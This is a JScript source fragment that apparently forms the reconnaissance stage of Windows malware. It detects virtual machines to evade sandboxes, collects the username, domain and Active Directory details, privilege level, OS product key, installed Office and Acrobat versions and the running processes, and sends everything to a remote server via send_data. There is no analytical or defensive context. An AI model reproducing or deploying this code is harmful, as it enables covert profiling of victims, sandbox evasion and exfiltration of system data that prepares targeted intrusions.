function is_vm() {
    var biosRequest = wmi.ExecQuery('SELECT * FROM Win32_BIOS');
    var biosItems = new Enumerator(biosRequest);
    for (; !biosItems.atEnd(); biosItems.moveNext()) {
        var bios_versoin = biosItems.item().SMBIOSBIOSVersion.toLowerCase();
        var serial_number = biosItems.item().SerialNumber.toLowerCase();
        if (serial_number.indexOf('parallels') >= 0 || serial_number.indexOf('vmware') >= 0) {
            return true;
        }
        if (bios_versoin.indexOf('vmware') >= 0 || bios_versoin.indexOf('virtualbox') >= 0) {
            return true;
        }
    }
    return false;
}

function get_active_directory_information() {
    try {
        var adobj = new ActiveXObject('ADSystemInfo');
        return adobj.ComputerName;
    } catch (e) {
        return false;
    }
}

function get_env_var(name) {
    return shell.ExpandEnvironmentStrings(name);
}

function getProc(pid) {
    return wmi.Get('Win32_process.Handle=' + pid);
}

function getPid() {
    return 0;
}

function acrobat(arch) {
    var ret = '';
    try{
        var exe = shell.RegRead("HKCR\\Software\\Adobe\\Acrobat\\Exe\\");
        ret = exe ? exe : '';
    }catch(e){}
    return ret;
}

function officeApp(aclass, exe, arch){
    var ret = '';
    try {
        var out = new ActiveXObject(aclass);
        ret = out.Name + "_" + out.Version + "_";
        var v = out.Version.split('.')
        var a = arch.substr(0, 2) != '64' ? 'x86' : null;
        if (!a) {
            a = fso.FileExists("C:\\Program Files\\Microsoft Office\\Office" + v[0] + "\\"+exe) ? 'x64' : 'x86';
        }
        ret += a;
        out.Quit(0, 0, 0);
    } catch (e) {}
    return ret;
}

function outlook(arch) {
    return officeApp("Outlook.Application", "OUTLOOK.EXE", arch);
}

function word(arch) {
    return officeApp("Word.Application", "WINWORD.EXE", arch);
}

function excel(arch) {
    return officeApp("Excel.Application", "EXCEL.EXE", arch);
}


function get_system_information() {
    var result = [];
    try {
        result.push('username***' + get_env_var('%USERNAME%'));
        result.push('hostname***' + get_env_var('%COMPUTERNAME%'));
        var elevated = shell.Run('cmd /c whoami /groups | find "12288"', 0, 1);
        result.push('elevated***' + (elevated == 0 ? 'yes' : 'no'));
        var owner = wmi.ExecMethod("Win32_Process.Handle='" + getPid() + "'", "GetOwner");
        result.push('process_owner***' + (owner ? owner.Domain + '\\' + owner.User : 'no'));
        var ad = get_active_directory_information();
        if (ad) {
            result.push('adinformation***' + ad);
        } else {
            result.push('adinformation***no_ad');
        }
        var csRequest = wmi.ExecQuery('Select * from Win32_ComputerSystem');
        var csItems = new Enumerator(csRequest);
        for (; !csItems.atEnd(); csItems.moveNext()) {
            if (csItems.item().PartOfDomain) {
                result.push('part_of_domain***yes');
            } else {
                result.push('part_of_domain***no');
            }
            result.push('pc_domain***' + csItems.item().Domain);
            result.push('pc_dns_host_name***' + csItems.item().DNSHostName);
            result.push('pc_model***' + csItems.item().Model);
        }
    } catch (e) {
        result.push('error0***code_error');
    }
    try {
        var osRequest = wmi.ExecQuery('select * from win32_OperatingSystem');
        var osItems = new Enumerator(osRequest);
        var arch = null;
        for (; !osItems.atEnd(); osItems.moveNext()) {
            result.push('os_name***' + osItems.item().Name);
            result.push('os_build_number***' + osItems.item().BuildNumber);
            result.push('os_version***' + osItems.item().Version);
            result.push('os_sp***' + osItems.item().ServicePackMajorVersion);
            result.push('os_memory***' + osItems.item().TotalVirtualMemorySize);
            result.push('os_free_memory***' + osItems.item().FreePhysicalMemory);
            result.push('os_registered_user***' + osItems.item().RegisteredUser);
            result.push('os_registered_org***' + osItems.item().Organization);
            result.push('os_registered_key***' + osItems.item().SerialNumber);
            result.push('os_last_boot***' + osItems.item().LastBootUpTime);
            result.push('os_install_date***' + osItems.item().InstallDate);
            arch = osItems.item().OSArchitecture;
            result.push('os_arch***' + osItems.item().OSArchitecture);
            result.push('os_product_type***' + osItems.item().ProductType);
            result.push('os_language_code***' + osItems.item().OSLanguage);
            result.push('os_timezone***' + osItems.item().CurrentTimeZone);
            result.push('os_number_of_users***' + osItems.item().NumberOfUsers);
        }
        var dmRequest = wmi.ExecQuery('select * from Win32_DesktopMonitor');
        var dmItems = new Enumerator(dmRequest);
        for (; !dmItems.atEnd(); dmItems.moveNext()) {
            result.push('dm_type***' + dmItems.item().MonitorType);
            result.push('dm_screen_size***' + dmItems.item().ScreenWidth + 'x' + dmItems.item().ScreenHeight);
        }
        if (shell.RegRead('HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA') == 1) {
            result.push('uac_level***yes');
        } else {
            result.push('uac_level***no');
        }
        result.push("outlook***" + outlook(arch));
        result.push("word***" + word(arch));
        result.push("excel***" + excel(arch));
        result.push("acrobat***" + acrobat(arch));
    } catch (e) {
        result.push('error1***code_error');
    }
    try {
        var pRequest = wmi.ExecQuery('select * from win32_process');
        var pItems = new Enumerator(pRequest);
        var process_array = [];
        for (; !pItems.atEnd(); pItems.moveNext()) {
            process_array.push(pItems.item().name + '!' + pItems.item().processid);
        }
        var process_string = process_array.join('@');
        result.push('process_list***' + process_string);
        if (is_vm()) {
            result.push('is_vm***Yes');
        } else {
            result.push('is_vm***No');
        }
    } catch (e) {
        result.push('error2***code_error');
    }
    return result.join('^^');
}
send_data('request', 'page_id=add_info&info=' + encodeURIComponent(get_system_information()), true);
'
